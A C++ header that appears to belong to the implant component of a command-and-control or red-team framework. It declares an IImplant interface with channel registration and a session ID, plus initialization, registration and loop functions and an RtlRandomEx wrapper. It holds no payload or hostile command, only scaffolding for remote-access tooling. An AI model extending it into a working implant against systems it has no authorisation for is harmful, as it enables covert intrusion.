#pragma once

#include "phnt.h"
#include <vector>
#include <string>
#include <nlohmann/json.hpp>

#include "Channel.h"

#pragma comment(lib, "ntdll.lib")

using json = nlohmann::json;
using string = std::string;

extern "C" {
	_Ret_range_(<= , MAXLONG)
		NTSYSAPI
		ULONG
		NTAPI
		RtlRandomEx(
			_Inout_ PULONG Seed
		);
}

inline ULONG RandomUint32() {
	ULONG seed = GetTickCount();
	return RtlRandomEx(&seed);
}

// IImplant interface for user to use at runtime ( register protocol, etc )
//
typedef struct {
	BOOL(*ChannelRegister)(IChannel*);
	
	// implant id
	DWORD SessionID;
} IImplant;


BOOL ImplantInitialize();
void ImplantRegister();
void ImplantLoop();

extern IImplant g_Implant;